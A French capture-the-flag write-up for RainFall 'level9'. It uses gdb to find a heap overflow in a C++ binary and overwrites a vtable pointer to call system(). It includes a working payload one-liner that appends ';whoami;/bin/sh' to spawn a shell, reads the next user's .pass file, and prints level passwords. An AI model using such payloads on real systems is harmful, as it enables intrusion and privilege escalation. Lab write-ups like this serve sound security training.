# LEVEL 9

On se connecte sur le level9, ou se trouve un **binaire** <code>level9</code>.

On cherche a savoir ce que fait ce binaire:

```gdb
> gdb -q level9
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.

(gdb) > i functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
```

Après analyse du fichier (**source.c**), on se rend compte que le programme appelle la fonction **memcpy** que nous pourront exploiter.
On commence par trouver l'offset

```gdb
(gdb) > b *main+131
Breakpoint 1 at 0x8048677
(gdb) > b *main+136
Breakpoint 2 at 0x804867c
(gdb) run BBBB
Starting program: /home/user/level9/level9 BBBB

Breakpoint 1, 0x08048677 in main ()
(gdb) > info proc mappings
process 13122
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
         0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
         0x804a000  0x806b000    0x21000        0x0 [heap]
         .............
(gdb) > x/100x 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000
....

(gdb) > c
Continuing.
Breakpoint 2, 0x0804867c in main ()

(gdb) > x/50x 0x804a000
0x804a000:      0x00000000      0x00000071      0x08048848      0x42424242
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000005      0x00000071      0x08048848      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000

(gdb) > x  0x08048848
0x8048848 <_ZTV1N+8>:   0x0804873a

(gdb) > i functions
All defined functions:

Non-debugging symbols:
...
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
...
```
On a mis un breakpoint avant l'appel de fonction de **setAnnotation** et un juste après pour obtenir l'adresse du début de notre **buffer**. En affichant la **heap** on remarque l'adresse d'un pointeur `0x08048848`,  ce pointeur pointe sur la méthode **N::operator+** de notre classe **N**.

On va donc chercher à écrire sur ce pointeur (qui est call dans la suite du main).
On recherche l'**offset** :

```gdb
(gdb) > p  0x804a078 - 0x804a00c
$1 = 108
```

> OFFSET = 108


```gdb
(gdb) b main
Breakpoint 1 at 0x80485f8
(gdb) run
Starting program: /home/user/level9/level9

Breakpoint 1, 0x080485f8 in main ()
(gdb) p *system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```

> SYSTEM = 0xb7d86060

En insérant l'adresse de **system** au début de notre buffer, nous pouvons par la suite réécrire sur l'adresse du pointeur pour que cette adresse pointe sur l'adresse de **system**. Ainsi, lors du call de notre pointeur déréférencé dans le main, le programme va effectuer un call vers **system**.

```bash
level9@RainFall:~$ ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08"'`
sh: 1: ♀: not found
```

On remarque que nous avons pu appeler **system**, malheureusement il semble compliqué d'insérer les arguments **exit** et **/bin/sh** directement au moment de notre call. Nous pouvons néanmoins insérer de nouvelles instructions à **system** après l'erreur grâce au `;` qui permet d'exécuter une commande même si la commande précédente à échouer (contrairement à `&&`) :

```bash
level9@RainFall:~$ > ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08;whoami;/bin/sh"'`
sh: 1: ♀: not found
bonus0
$ > cd ../bonus0/ && cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

For download :
<pre><code>scp -P4242 level9@IP:level9 .</code></pre>
> Password : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a